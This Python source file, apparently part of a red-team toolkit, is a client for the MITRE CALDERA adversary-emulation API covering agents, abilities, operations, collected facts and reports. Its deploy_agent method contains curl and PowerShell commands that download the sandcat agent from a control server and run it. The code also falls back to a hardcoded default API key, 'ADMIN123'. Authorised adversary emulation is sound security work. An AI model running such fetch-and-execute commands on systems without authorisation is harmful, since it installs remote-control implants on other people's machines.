"""
RedClaw Engines - CALDERA Client
MITRE CALDERA Integration for Adversary Emulation
"""

import asyncio
import httpx
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum


class OperationState(Enum):
    """CALDERA operation states"""
    CREATED = "created"
    RUNNING = "running"
    PAUSED = "paused"
    FINISHED = "finished"
    CLEANUP = "cleanup"


@dataclass
class Agent:
    """CALDERA agent"""
    paw: str
    host: str
    platform: str
    executors: List[str]
    privilege: str
    contact: str
    created: datetime = field(default_factory=datetime.now)


@dataclass
class Ability:
    """CALDERA ability (technique)"""
    ability_id: str
    name: str
    tactic: str
    technique_id: str
    technique_name: str
    description: str


@dataclass
class Operation:
    """CALDERA operation"""
    id: str
    name: str
    adversary_id: str
    state: OperationState
    agents: List[str] = field(default_factory=list)
    chain: List[Dict] = field(default_factory=list)


class CALDERAClient:
    """
    MITRE CALDERA Client
    
    Integration with CALDERA for:
    - Adversary emulation
    - ATT&CK technique execution
    - Agent deployment
    - Operation management
    
    Reference: https://caldera.mitre.org/
    """
    
    def __init__(
        self,
        base_url: str = "http://localhost:8888",
        api_key: str = None
    ):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key or "ADMIN123"  # Default CALDERA key
        
        self.headers = {
            "KEY": self.api_key,
            "Content-Type": "application/json"
        }
        
        self.client = httpx.AsyncClient(
            base_url=self.base_url,
            headers=self.headers,
            timeout=60.0
        )
    
    async def health_check(self) -> bool:
        """Check CALDERA availability"""
        try:
            response = await self.client.get("/api/v2/health")
            return response.status_code == 200
        except:
            return False
    
    # ============ Agents ============
    
    async def list_agents(self) -> List[Agent]:
        """List all connected agents"""
        try:
            response = await self.client.get("/api/v2/agents")
            response.raise_for_status()
            
            agents = []
            for a in response.json():
                agents.append(Agent(
                    paw=a.get("paw", ""),
                    host=a.get("host", ""),
                    platform=a.get("platform", ""),
                    executors=a.get("executors", []),
                    privilege=a.get("privilege", "User"),
                    contact=a.get("contact", "")
                ))
            return agents
        except Exception as e:
            return []
    
    async def get_agent(self, paw: str) -> Optional[Agent]:
        """Get specific agent"""
        try:
            response = await self.client.get(f"/api/v2/agents/{paw}")
            response.raise_for_status()
            a = response.json()
            return Agent(
                paw=a.get("paw", ""),
                host=a.get("host", ""),
                platform=a.get("platform", ""),
                executors=a.get("executors", []),
                privilege=a.get("privilege", "User"),
                contact=a.get("contact", "")
            )
        except:
            return None
    
    async def deploy_agent(
        self,
        platform: str = "linux",
        contact: str = "http"
    ) -> Dict:
        """Get agent deployment command"""
        
        deploy_commands = {
            "linux": f"curl -s {self.base_url}/file/sandcat.go -o sandcat && chmod +x sandcat && ./sandcat -server {self.base_url} -group red",
            "windows": f"powershell -c \"Invoke-WebRequest -Uri {self.base_url}/file/sandcat.go -OutFile sandcat.exe; .\\sandcat.exe -server {self.base_url} -group red\"",
            "darwin": f"curl -s {self.base_url}/file/sandcat.go -o sandcat && chmod +x sandcat && ./sandcat -server {self.base_url} -group red"
        }
        
        return {
            "platform": platform,
            "contact": contact,
            "command": deploy_commands.get(platform, deploy_commands["linux"]),
            "note": "Execute on target system to deploy agent"
        }
    
    # ============ Abilities ============
    
    async def list_abilities(
        self,
        tactic: str = None
    ) -> List[Ability]:
        """List available abilities"""
        try:
            response = await self.client.get("/api/v2/abilities")
            response.raise_for_status()
            
            abilities = []
            for a in response.json():
                if tactic and a.get("tactic") != tactic:
                    continue
                abilities.append(Ability(
                    ability_id=a.get("ability_id", ""),
                    name=a.get("name", ""),
                    tactic=a.get("tactic", ""),
                    technique_id=a.get("technique_id", ""),
                    technique_name=a.get("technique_name", ""),
                    description=a.get("description", "")
                ))
            return abilities
        except:
            return []
    
    async def get_ability(self, ability_id: str) -> Optional[Ability]:
        """Get specific ability"""
        try:
            response = await self.client.get(f"/api/v2/abilities/{ability_id}")
            response.raise_for_status()
            a = response.json()
            return Ability(
                ability_id=a.get("ability_id", ""),
                name=a.get("name", ""),
                tactic=a.get("tactic", ""),
                technique_id=a.get("technique_id", ""),
                technique_name=a.get("technique_name", ""),
                description=a.get("description", "")
            )
        except:
            return None
    
    async def search_abilities_by_technique(
        self,
        technique_id: str
    ) -> List[Ability]:
        """Search abilities by ATT&CK technique ID"""
        abilities = await self.list_abilities()
        return [a for a in abilities if technique_id in a.technique_id]
    
    # ============ Adversaries ============
    
    async def list_adversaries(self) -> List[Dict]:
        """List adversary profiles"""
        try:
            response = await self.client.get("/api/v2/adversaries")
            response.raise_for_status()
            return response.json()
        except:
            return []
    
    async def create_adversary(
        self,
        name: str,
        description: str,
        ability_ids: List[str]
    ) -> Optional[Dict]:
        """Create custom adversary profile"""
        try:
            payload = {
                "name": name,
                "description": description,
                "atomic_ordering": ability_ids
            }
            response = await self.client.post("/api/v2/adversaries", json=payload)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            return {"error": str(e)}
    
    # ============ Operations ============
    
    async def create_operation(
        self,
        name: str,
        adversary_id: str,
        planner: str = "atomic",
        group: str = "red"
    ) -> Optional[Operation]:
        """Create new operation"""
        try:
            payload = {
                "name": name,
                "adversary": {"adversary_id": adversary_id},
                "planner": {"id": planner},
                "group": group,
                "auto_close": False
            }
            response = await self.client.post("/api/v2/operations", json=payload)
            response.raise_for_status()
            
            op = response.json()
            return Operation(
                id=op.get("id", ""),
                name=op.get("name", ""),
                adversary_id=adversary_id,
                state=OperationState.CREATED
            )
        except Exception as e:
            return None
    
    async def run_operation(self, operation_id: str) -> bool:
        """Start operation execution"""
        try:
            payload = {"state": "running"}
            response = await self.client.patch(
                f"/api/v2/operations/{operation_id}",
                json=payload
            )
            return response.status_code == 200
        except:
            return False
    
    async def get_operation_status(
        self,
        operation_id: str
    ) -> Optional[Operation]:
        """Get operation status and results"""
        try:
            response = await self.client.get(f"/api/v2/operations/{operation_id}")
            response.raise_for_status()
            
            op = response.json()
            return Operation(
                id=op.get("id", ""),
                name=op.get("name", ""),
                adversary_id=op.get("adversary", {}).get("adversary_id", ""),
                state=OperationState(op.get("state", "created")),
                agents=[a.get("paw") for a in op.get("host_group", [])],
                chain=op.get("chain", [])
            )
        except:
            return None
    
    async def get_operation_results(
        self,
        operation_id: str
    ) -> List[Dict]:
        """Get detailed operation results"""
        try:
            response = await self.client.get(
                f"/api/v2/operations/{operation_id}/links"
            )
            response.raise_for_status()
            return response.json()
        except:
            return []
    
    async def stop_operation(self, operation_id: str) -> bool:
        """Stop running operation"""
        try:
            payload = {"state": "finished"}
            response = await self.client.patch(
                f"/api/v2/operations/{operation_id}",
                json=payload
            )
            return response.status_code == 200
        except:
            return False
    
    # ============ Facts ============
    
    async def get_facts(self, operation_id: str) -> List[Dict]:
        """Get facts collected during operation"""
        try:
            response = await self.client.get(
                f"/api/v2/operations/{operation_id}/facts"
            )
            response.raise_for_status()
            return response.json()
        except:
            return []
    
    # ============ Reporting ============
    
    async def generate_report(
        self,
        operation_id: str
    ) -> Dict:
        """Generate operation report"""
        
        operation = await self.get_operation_status(operation_id)
        results = await self.get_operation_results(operation_id)
        facts = await self.get_facts(operation_id)
        
        if not operation:
            return {"error": "Operation not found"}
        
        # Analyze results
        successful = [r for r in results if r.get("status") == 0]
        failed = [r for r in results if r.get("status") != 0]
        
        techniques_used = set()
        for r in results:
            ability = r.get("ability", {})
            if ability.get("technique_id"):
                techniques_used.add(ability.get("technique_id"))
        
        return {
            "operation_id": operation.id,
            "name": operation.name,
            "state": operation.state.value,
            "agents": operation.agents,
            "total_links": len(results),
            "successful": len(successful),
            "failed": len(failed),
            "success_rate": len(successful) / len(results) if results else 0,
            "techniques_used": list(techniques_used),
            "facts_collected": len(facts),
            "fact_types": list(set(f.get("trait") for f in facts if f.get("trait")))
        }
    
    async def close(self):
        """Close client"""
        await self.client.aclose()
